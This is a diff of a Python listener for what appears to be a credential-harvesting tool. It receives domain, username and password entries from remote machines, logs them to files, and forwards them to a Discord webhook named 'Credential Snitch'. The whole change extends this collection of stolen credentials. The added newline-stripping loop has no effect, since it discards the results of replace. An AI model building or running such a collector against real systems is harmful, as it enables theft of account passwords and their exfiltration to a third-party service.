@@ -8,21 +8,28 @@ import datetime
 import requests
 
 def connection(conn, addr, args):
-    data = conn.recv(200).decode('ascii', errors='ignore').split("\n", 2)
-    if len(data) != 3:
+    data = conn.recv(2048).decode('ascii', errors='ignore').split("\r\n", 4)
+    if len(data) != 5:
+        print(f'malformed connection {data}')
         return
 
     ip = addr[0]
     fqdn = data[0]
-    username = data[1]
-    password = data[2]
+    domain = data[1]
+    username = data[2]
+    password = data[3]
+    extra = data[4]
+
+    for string in [fqdn, domain, username, password, extra]:
+        string.replace("\n", "").replace("\r", "")
+
     timestamp = datetime.datetime.now().strftime("%m/%d %I:%M:%S")
 
-    print(f"{timestamp}\n{fqdn} {ip}\n{username} {password}\n")
+    print(f'{timestamp} {extra}\n{fqdn} {ip}\nd:"{domain}" u:"{username}" p:"{password}"\n')
 
     if args.discord != "":
         data = {
-            "content" : f"{timestamp}\n{fqdn} {ip}\n`{username}` `{password}`\n",
+            "content" : f"{timestamp} {extra}\n{fqdn} {ip}\n`{domain}` `{username}` `{password}`\n",
             "username" : "Credential Snitch",
             # "avatar_url" : "https://media.discordapp.net/attachments/1101174538550657085/1104529143556747284/hpcc_logo_red.png"
         }
@@ -30,7 +37,7 @@ def connection(conn, addr, args):
 
     if args.write == True:
         with open(os.path.join("creds", fqdn), "a") as f:
-            f.write(f"{timestamp} {fqdn} {ip} {username} {password}\n")
+            f.write(f"{timestamp} {extra} {fqdn} {ip} {domain} {username} {password}\n")
 
 def get_args():
     parser = argparse.ArgumentParser()
